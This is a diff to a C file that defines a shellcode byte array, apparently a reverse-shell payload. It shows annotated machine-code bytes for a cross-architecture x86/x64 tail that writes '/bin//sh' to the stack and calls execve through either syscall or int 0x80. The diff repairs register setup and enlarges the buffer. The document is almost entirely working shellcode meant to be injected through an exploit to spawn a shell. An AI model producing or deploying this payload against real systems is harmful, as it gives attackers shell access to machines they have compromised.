@@ -1,5 +1,5 @@
 
-#define RS_SIZE 129
+#define RS_SIZE 132
 
 char RS[] = {
   /* 0000 */ "\xb9\xfd\xff\xfb\x2d"         /* mov ecx, 0x2dfbfffd             */
@@ -58,18 +58,21 @@ char RS[] = {
   /* 005D */ "\xcd\x80"                     /* int 0x80                        */
   /* 005F */ "\x99"                         /* cdq                             */
   /* 0060 */ "\x50"                         /* push rax                        */
-  /* 0061 */ "\x50"                         /* push rax                        */
+  /* 0061 */ "\x5e"                         /* pop rsi                         */
   /* 0062 */ "\x50"                         /* push rax                        */
-  /* 0063 */ "\x54"                         /* push rsp                        */
-  /* 0064 */ "\x5b"                         /* pop rbx                         */
-  /* 0065 */ "\x53"                         /* push rbx                        */
-  /* 0066 */ "\x5f"                         /* pop rdi                         */
-  /* 0067 */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
-  /* 006D */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
-  /* 0074 */ "\x48\x78\x04"                 /* js 0x7b                         */
-  /* 0077 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
-  /* 0079 */ "\x0f\x05"                     /* syscall                         */
-  /* 007B */ "\x31\xc9"                     /* xor ecx, ecx                    */
-  /* 007D */ "\x04\x0c"                     /* add al, 0xc                     */
-  /* 007F */ "\xcd\x80"                     /* int 0x80                        */
+  /* 0063 */ "\x50"                         /* push rax                        */
+  /* 0064 */ "\x50"                         /* push rax                        */
+  /* 0065 */ "\x54"                         /* push rsp                        */
+  /* 0066 */ "\x5b"                         /* pop rbx                         */
+  /* 0067 */ "\x53"                         /* push rbx                        */
+  /* 0068 */ "\x5f"                         /* pop rdi                         */
+  /* 0069 */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
+  /* 006F */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
+  /* 0076 */ "\x48\x78\x04"                 /* js 0x7d                         */
+  /* 0079 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
+  /* 007B */ "\x0f\x05"                     /* syscall                         */
+  /* 007D */ "\x31\xc9"                     /* xor ecx, ecx                    */
+  /* 007F */ "\x6a\x0b"                     /* push 0xb                        */
+  /* 0081 */ "\x58"                         /* pop rax                         */
+  /* 0082 */ "\xcd\x80"                     /* int 0x80                        */
 };
